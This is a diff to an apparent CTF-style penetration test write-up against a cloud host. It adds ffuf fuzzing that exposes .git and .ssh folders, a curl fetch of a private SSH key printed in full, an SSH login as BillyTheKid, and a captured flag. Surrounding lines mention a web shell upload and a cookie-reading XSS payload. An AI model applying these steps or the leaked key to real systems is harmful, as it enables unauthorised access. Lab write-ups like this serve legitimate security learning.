@@ -3,6 +3,9 @@
 **Date**: October 25, 2025  
 **Target**: 13.40.110.252 (ec2-13-40-110-252.eu-west-2.compute.amazonaws.com)
 
+**Flags**:
+ - 1 of 3 Billy The Kid Flag : fdoQ#9G#%R6yo_JL
+
 ## 1. Setup and Approach
 
 ### 1.1 Hybrid Attack Setup
@@ -163,13 +166,6 @@ Ran an initial scan from the EC2 instance to identify services and potential vec
   [DIR]	screenshots/
   ```
 
-- **ffuf**:
-  ```
-  ffuf -w common.txt -u http://13.40.110.252/portfolio_one-page-template/build/FUZZ
-  ffuf -w common.txt -u http://13.40.110.252/portfolio_one-page-template/FUZZ
-  Reveals nothing very interesting, a .git which has no commits/obvious secrets and a build /static/ with no upload or form login entry.
-  ```
-
 - **Web Shell**: 
    Browsing to `portfolio_one-page-template/screenshots/uploads/`, we can find our test1.txt file. Dropping a web shell here works, though it does not execute our php.
    ```
@@ -189,11 +185,48 @@ Uploading a `<script>alert(document.domain)</script>` confirms it can render js,
   cookie: document.cookie
   ```
 
+- **ffuf**:
+  ```
+  ffuf -w common.txt -u http://13.40.110.252/portfolio_one-page-template/build/FUZZ
+  ffuf -w common.txt -u http://13.40.110.252/portfolio_one-page-template/FUZZ
+  ```
+  Immediate findings are .git and .ssh, .ssh containing a public and private key, id_ed25519, id_ed25519.pub, with the .pub containing a username, BillyTheKid.
 
-- **Notes**: I found nothing remarkable when looking through the underlying logic in .js or any secrets in .cfg files. /build/ gives us a direct render of the site, `gulp_tasks/config/paths.js`does not reference `/screenshots/uploads` at all. 
+- **Notes**: I found nothing remarkable when looking through the underlying logic in .js or any secrets in .cfg files. /build/ gives us a direct render of the site, `gulp_tasks/config/paths.js`does not reference `/screenshots/uploads` at all.
+The .pub file 
 
 ### 3.3 SMTP
 - **Notes**: Trying various different nmap scans `-sT -sX` etc and various timeout intervals yield no results, it's a hard filtered port, likely accessible locally from a web/reverse shell.
+
+## 4. Privilege Escalation and 
+
+### 4.1 Initial Access
+
+- **Using the Private Key**:
+   ```
+   curl http://13.40.110.252/portfolio_one-page-template/.ssh/id_ed25519
+   
+  -----BEGIN OPENSSH PRIVATE KEY-----
+   b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+   QyNTUxOQAAACAe1sKEMCCig7Q0ZW5Qdu/cg/wspJLMLBO9puEG1pbLYwAAAJij6Mx/o+jM
+   fwAAAAtzc2gtZWQyNTUxOQAAACAe1sKEMCCig7Q0ZW5Qdu/cg/wspJLMLBO9puEG1pbLYw
+   AAAECAO7jrO8DIkMbeCcll0I/iOlt4I+5TMpkLAOw2VF5jkh7WwoQwIKKDtDRlblB279yD
+   /CykkswsE72m4QbWlstjAAAAFHJvb3RAaXAtMTcyLTMxLTYtMTIwAQ==
+  -----END OPENSSH PRIVATE KEY-----
+   ```
+- **SSH**:
+  ```
+  ssh -i key BillyTheKid@13.40.110.252
+  BillyTheKid@ip-172-31-14-224:~$
+  BillyTheKid@ip-172-31-14-224:~$ ls
+  Flag_1  Message_from_your_friendly_neighbourhood_root
+  BillyTheKid@ip-172-31-14-224:~$ cat Flag_1
+  
+  1 of 3 Billy The Kid Flag : fdoQ#9G#%R6yo_JL
+  ```
+
+
+
 
 
 
